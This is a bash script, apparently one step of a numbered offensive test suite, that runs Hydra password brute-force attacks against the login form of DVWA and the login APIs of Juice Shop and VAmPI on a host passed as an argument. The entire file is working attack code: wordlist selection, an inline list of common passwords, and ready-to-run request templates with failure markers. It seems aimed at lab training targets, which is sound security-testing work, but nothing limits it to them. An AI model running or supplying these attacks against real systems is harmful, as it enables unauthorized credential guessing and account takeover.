#!/bin/bash
# Credential brute-force with Hydra
# Tools: hydra
# Targets: DVWA login form, Juice Shop login API
# Estimated duration: 1-2 minutes
set -uo pipefail

TARGET="${1:?Usage: 05-hydra-brute-force.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] Hydra brute-force suite against ${TARGET}"
echo ""

# --- Determine password list ---
WORDLIST=""
SECLISTS_CANDIDATES=(
  "/opt/seclists/Passwords/Common-Credentials/darkweb2017_top-100.txt"
  "/opt/seclists/Passwords/Common-Credentials/probable-v2_top-207.txt"
  "/usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-100.txt"
)

for wl in "${SECLISTS_CANDIDATES[@]}"; do
  if [[ -f "$wl" ]]; then
    WORDLIST="$wl"
    break
  fi
done

# Fall back to inline list if no seclists found
if [[ -z "$WORDLIST" ]]; then
  echo "[+] SecLists not found, creating inline password list..."
  WORDLIST=$(mktemp /tmp/hydra-passwords.XXXXXX)
  trap 'rm -f "${WORDLIST}"' EXIT
  cat >"${WORDLIST}" <<'PASSEOF'
password
123456
12345678
admin
letmein
welcome
monkey
dragon
master
qwerty
login
abc123
password1
admin123
iloveyou
PASSEOF
fi

echo "[+] Using password list: ${WORDLIST}"
PASS_COUNT=$(wc -l <"${WORDLIST}")
echo "    Passwords in list: ${PASS_COUNT}"
echo ""

# --- 1. DVWA HTTP POST form brute-force ---
echo "[+] Attack 1: DVWA login form brute-force"
echo "    Target: ${TARGET}/dvwa/login.php"
echo "    User:   admin"

hydra -l admin -P "${WORDLIST}" \
  -s 443 \
  "${TARGET}" \
  https-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
  -t 2 -w 5 -v ||
  echo "    WARN: hydra DVWA attack returned non-zero (may not have found valid creds)"

echo ""

# --- 2. Juice Shop REST API brute-force ---
echo "[+] Attack 2: Juice Shop login API brute-force"
echo "    Target: ${TARGET}/juice-shop/rest/user/login"
echo "    User:   admin@juice-sh.op"

hydra -l "admin@juice-sh.op" -P "${WORDLIST}" \
  -s 443 \
  "${TARGET}" \
  https-post-form \
  '/juice-shop/rest/user/login:{"email"\:"^USER^","password"\:"^PASS^"}:F=Invalid:H=Content-Type\: application/json' \
  -t 2 -w 5 -v ||
  echo "    WARN: hydra Juice Shop attack returned non-zero (may not have found valid creds)"

echo ""

# --- 3. VAmPI API login brute-force ---
echo "[+] Attack 3: VAmPI login API brute-force"
echo "    Target: ${TARGET}/vampi/users/v1/login"
echo "    User:   admin"

hydra -l admin -P "${WORDLIST}" \
  -s 443 \
  "${TARGET}" \
  https-post-form \
  '/vampi/users/v1/login:{"username"\:"^USER^","password"\:"^PASS^"}:F=error:H=Content-Type\: application/json' \
  -t 2 -w 5 -v ||
  echo "    WARN: hydra VAmPI attack returned non-zero (may not have found valid creds)"

echo ""
echo "[*] Hydra brute-force suite complete"
